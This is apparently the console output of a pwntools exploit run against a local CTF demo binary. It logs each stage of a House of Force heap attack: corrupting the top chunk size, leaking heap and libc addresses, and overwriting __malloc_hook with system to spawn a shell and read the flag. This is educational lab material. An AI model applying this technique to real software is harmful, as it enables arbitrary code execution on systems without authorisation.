```
# python3 pwn-hof.py BIN=./medal_patched
[*] '/demos/hof-demo/medal_patched'

/demos/hof-demo/pwn-hof.py:7: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  libc = ELF(e.runpath + b"/libc.so.6")
[*] '/demos/hof-demo/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/demos/hof-demo/medal_patched': pid 221
[*] Setting Top Chunk Size == 0xfffffffffffffff1 
[*] Paused (press any to continue)
[*] Leaking Heap, Libc.Address
[*] Heap = 0xee1260
[*] Libc = 0x7fa605f25000
[*] Paused (press any to continue)
[*] Setting Top Chunk Addr = __mallock_hook - 0x10
[*] Paused (press any to continue)
[*] Cannot Overwrite __malloc_hook with libc.sym.system since 0x20 exists in : 0x7fa605f74420 
[*] Fixed by using sym.system  + 0x5 (0x7fa605f74425) to overwrite __malloc_hook
[*] Paused (press any to continue)
[*] Calling malloc("/bin/sh"), which is now system("/bin/sh")
[*] Switching to interactive mode
 $ cat flag.txt
flag{i_sure_wish_it_worked_remotely}
```